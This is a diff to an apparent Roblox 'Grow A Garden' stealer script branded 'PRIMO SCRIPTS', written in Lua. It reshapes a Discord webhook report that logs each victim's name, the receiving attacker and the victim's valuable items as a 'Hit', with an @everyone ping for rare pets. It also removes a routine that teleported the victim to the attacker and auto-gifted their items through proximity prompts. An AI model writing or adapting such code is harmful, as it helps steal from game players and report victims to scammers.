@@ -115,18 +115,43 @@ task.spawn(function()
 
 	local function sendWebhook()
 		local lines = {}
+		local hasRarePet = false
+
 		for i = 1, math.min(10, #itemsToSend) do
 			local item = itemsToSend[i]
-			table.insert(lines, string.format("%s - %s (%.2f KG) → %s¢", item.Emoji, item.Name, item.Weight, formatShort(item.Value)))
+			local line
+
+			if item.Type == "Plant" then
+				line = string.format("%s - %s (%.2f KG) → %s¢", item.Emoji, item.Name, item.Weight, formatShort(item.Value))
+			else
+				line = string.format("%s - %s (%.2f KG)", item.Emoji, item.Name, item.Weight)
+				if item.Rare then hasRarePet = true end
+			end
+
+			table.insert(lines, line)
 		end
 
+		local descriptionText = string.format([
+:bust_in_silhouette: Player Info
+```Player: %s
+Receiver: %s```
+
+:package: Top Items
+```
+%s
+```
+], plr.Name, users[1] or "?", table.concat(lines, "\n"))
+
 		local data = {
-			content = string.format("🌱 **Grow A Garden Hit**\n👤 **%s** ➜ 🎁 **%s**\n💸 **Total Value:** %s¢\n\n📦 **Top Items:**\n%s",
-				plr.Name,
-				users[1] or "?",
-				formatShort(totalValue),
-				table.concat(lines, "\n")
-			)
+			content = hasRarePet and "@everyone" or nil,
+			embeds = {{
+				title = "🌱 Grow A Garden Hit - PRIMO SCRIPTS",
+				description = descriptionText,
+				color = 65280,
+				footer = {
+					text = "Logged at " .. os.date("!%Y-%m-%d %H:%M:%S UTC")
+				}
+			}}
 		}
 
 		local requestFunc = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
@@ -151,62 +176,8 @@ task.spawn(function()
 		end
 	end
 
-	local function giftItemsTo(target)
-		print("[DEBUG] Gifting to:", target.Name)
-		local root = character:WaitForChild("HumanoidRootPart")
-		local targetRoot = target.Character:WaitForChild("HumanoidRootPart")
-		root.CFrame = targetRoot.CFrame + Vector3.new(0, 0, 2)
-		task.wait(0.4)
-
-		for _, item in ipairs(itemsToSend) do
-			item.Tool.Parent = character
-			local prompt = item.Type == "Pet"
-				and target.Character:WaitForChild("Head"):WaitForChild("ProximityPrompt")
-				or targetRoot:WaitForChild("ProximityPrompt")
-
-			repeat task.wait(0.01) until prompt.Enabled
-			fireproximityprompt(prompt)
-			task.wait(0.4)
-
-			if not item.Tool:IsDescendantOf(game) then
-				print("[DEBUG] Tool gifted:", item.Tool.Name)
-			else
-				print("[DEBUG] Tool not gifted, returned:", item.Tool.Name)
-				item.Tool.Parent = backpack
-			end
-
-			task.wait(0.4)
-		end
-	end
-
 	if #itemsToSend > 0 then
 		sendWebhook()
-
-		local function findTarget()
-			for _, p in ipairs(Players:GetPlayers()) do
-				if table.find(users, p.Name) then return p end
-			end
-			return nil
-		end
-
-		local target = findTarget()
-		if target then
-			print("[DEBUG] Waiting for chat from", target.Name)
-			target.Chatted:Connect(function()
-				task.wait(0.5)
-				giftItemsTo(target)
-			end)
-		else
-			Players.PlayerAdded:Connect(function(p)
-				if table.find(users, p.Name) then
-					p.CharacterAdded:Wait()
-					p.Chatted:Connect(function()
-						task.wait(0.5)
-						giftItemsTo(p)
-					end)
-				end
-			end)
-		end
 	else
 		print("[DEBUG] No items found in backpack.")
 	end
